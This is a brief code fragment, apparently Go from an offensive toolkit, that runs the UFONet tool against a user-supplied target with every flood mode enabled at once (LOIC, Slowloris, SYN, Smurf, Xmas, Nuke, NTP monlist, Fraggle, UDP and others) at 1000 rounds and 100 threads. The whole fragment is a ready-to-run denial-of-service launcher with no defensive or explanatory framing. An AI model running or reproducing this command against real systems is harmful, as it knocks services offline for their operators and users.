    subprocess.Popen(`cd /root/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --spray "1000" --smurf "1000" --xmas "1000" --nuke "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"`, userTarget); fmt.Println()
}
